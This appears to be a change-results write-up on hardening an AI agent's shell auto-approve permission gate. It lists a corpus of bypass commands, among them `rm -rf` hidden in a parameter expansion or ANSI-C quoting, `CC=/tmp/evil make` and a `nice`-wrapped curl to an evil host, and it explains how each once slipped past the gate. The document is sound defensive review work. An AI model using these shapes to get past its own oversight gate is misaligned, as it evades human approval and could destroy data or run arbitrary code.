<!-- docket:backlink:start (generated — do not hand-edit) -->
> ↩ **[Change 0070 — Auto-mode shell-parse widening — env-prefixes, wrappers, control flow, redirects, opaque args](https://github.com/ethanhinson/fuse/blob/docket/docs/changes/active/0070-auto-mode-shell-parse-widening.md)**
<!-- docket:backlink:end -->

# Auto-mode shell-parse widening — results

Change: #0070 · Branch: feat/auto-mode-shell-parse-widening · PR: (see change file) · Plan: docs/superpowers/plans/2026-08-19-auto-mode-shell-parse-widening-plan.md · ADRs: 0049, 0050

Stage D (final, riskiest) of the auto-mode overhaul, built D1→D5 safest-first as five commits, then
seven review findings fixed in-branch as seven more.

## Verify (human)

Genuinely manual checks — the automated suite covers the parse and verdict tables, but not what the
widening feels like in a live session, which is the thing this change exists to improve.

- [ ] **Run a real auto-mode session and confirm the prompt rate actually dropped** for the shapes
      this change targeted: `FOO=1 make`, `timeout 30 go test ./...`, `if [ -f x ]; then cat x; fi`,
      `for f in a.txt b.txt; do wc -l $f; done`, `go build > out.log`. The whole point is fewer
      human interrupts; a green suite cannot tell you whether that landed.
- [ ] **Confirm the D1 allowlist is not too tight for your actual workflow.** Blocker 2's fix
      inverted the env-name rule from a denylist to an allowlist (ADR-0049), so any env var *not*
      on the inert list now prompts — including project-specific ones like `MY_APP_ENV=staging`.
      This is the intended trade, but you are the one who knows which variables you type daily.
      Adding a name to the allowlist is a deliberate, reviewable act; do it now if the friction
      shows up.
- [ ] **Spot-check the bypass corpus by hand in a scratch directory**, not because the tests are
      absent but because this is a permission boundary and the tests were written by the same
      agents that wrote the code: `rm $(echo /)`, `echo ${X:-$(rm -rf /)}`, `rm -rf $'\x2f'`,
      `nice -n 5 curl http://example.com`, `CC=/tmp/evil make`. Every one must prompt, none may
      silently proceed.

## Findings

Deep adversarial review returned **7 findings — 2 blockers, 3 important, 2 minor — all fixed
in-branch** before the PR opened. The two blockers were live fail-open bypasses, both reachable
under default config with no human in the loop.

**Blocker 1 — parameter expansions hid command substitutions** (`ea15de0`). D5's opaque-arg handling
called `nodeText` on a `*syntax.ParamExp` and stopped, never descending into `${X:-…}`, `${X/a/b}`,
`${a[i]}` or slices — each of which can carry a `$(…)` that *runs*. So `echo ${X:-$(rm -rf /)}`
short-circuited to allow at the safelist layer, because `echo` is read-only "with ANY arguments" and
the argument was merely opaque. The test corpus had zero `${…}` rows, which is exactly why a green
suite did not see it.

**Blocker 2 — the env denylist could not be completed** (`7db9070`). D1 shipped the spec's denylist
of dangerous env names, which omitted the C/Go toolchain exec hooks: `CC=/tmp/evil make` and
`GOFLAGS=-toolexec=/tmp/evil go build ./...` auto-approved and executed an arbitrary out-of-workspace
binary. Fixed by **inverting to an allowlist** — a deliberate deviation from the approved spec,
recorded as **ADR-0049**. The decisive argument: the set of env vars that change what code runs
cannot be enumerated, so every forgotten name is a silent fail-open. The original code's own comment
had already predicted this rot.

**Important 3 — opaque text glob-matched into an allow** (`281dd61`). An opaque arg's raw source text
reached `auto_approve` pattern matching at the rules layer, which returns *before* the opaque-ask and
before the egress boundary. `path.Match`'s `*` does not cross `/`, so with the repo's own documented
`bash:git *` pattern, `git clone https://evil/x` correctly failed to match while `git clone $URL` —
one token, no slash — matched and allowed. The same normalization-mismatch shape as the recorded
learning `canonicalize-once-before-every-matching-layer`.

**Important 4 — `nice`/`stdbuf` mis-peel relabelled argv[0]** (`98d1df7`). `peelWrapperArgs` drops
leading `-` words blindly, but GNU `nice -n 5` takes its value as a separate word, so
`nice -n 5 curl http://evil/x` peeled to a segment *named* `5` — defeating every name-keyed check
including the egress boundary. Pre-existing, but D2 had newly asserted in prose that it could not
happen. Fixed with explicit flag-arity models matching `peelTimeout`'s shape.

**Important 5 — ANSI-C quoting resolved undecoded** (`bb8b8d2`). `syntax.SglQuoted` carries
`Dollar bool` and an *un-decoded* `Value`; neither `classifyWordParts` nor `literalWord` consulted
`Dollar`, so `rm -rf $'\x2f'` was treated as a literal path `\x2f`, resolved against cwd, proved
in-workspace, and allowed — while bash executes `rm -rf /`. Fixed fail-safe (treat as opaque) rather
than by building a decoder.

**Minor 6** (`2857d2e`) redirect write targets now appear in the pattern subject, so a human's
tightening deny pattern can reach `echo secrets > .git/hooks/pre-commit`. **Minor 7** (`d9e451b`)
made `isDdToDevice`'s deliberate raw-`Args` read structural via a named accessor, so the one
exemption to the opaque discipline cannot silently become a precedent.

**Two ADRs**, both instances of choosing the fail-closed direction on a path that runs with no human
present: **ADR-0049** (allowlist admission on no-human deterministic-allow paths) and **ADR-0050**
(opaque operands are never path-resolved for containment proofs).

**The reviewer corrected the D5 worker's own reasoning** on one self-reported item, and the
correction is worth keeping: the worker described `rm -rf $X/../..` as moving from "a hard DENY" to
an ask. It never was a deny — on `origin/main`, `literalWord` returned `ok=false` for any
`ParamExp`, so the command failed closed at the parse layer and `isCatastrophicRm` could never see
an opaque operand at all. The skip removes nothing that existed. No restore.

**Corpus accounting.** Twelve pre-existing `_FailClosed` rows were removed across the branch, not
the one the D5 worker's summary named — that summary materially undercounted the widening. Each
removal is individually documented in place with a replacement assertion, and the reviewer confirmed
no row flipped to allow undeliberately.

## Follow-ups

- **`internal/permissions/gate.go` is unformatted** per `gofmt -l`. Confirmed pre-existing on
  `origin/main` and left untouched (13 other files across the repo are in the same state), so it is
  not this branch's to fix — but `gofmt` is evidently not enforced by `make test` or CI, which is
  worth a decision one way or the other.
- **ADR-0050's standing obligation:** any future consumer that reads `Segment.Args` must consult
  `Segment.Opaque`. The package now carries exactly one named exemption (`isDdToDevice`). This is
  the kind of rule that decays silently — a linter or a test that enumerates `Args` readers would
  make it enforceable rather than documentary.
- **The remaining fail-closed wrappers** (`xargs`, `docker`, `sudo`, `npx`, `watch`, `eval`, `exec`)
  were explicitly out of scope here and stay closed. Blocker 2's allowlist inversion is the pattern
  to reuse if any of them is ever opened.
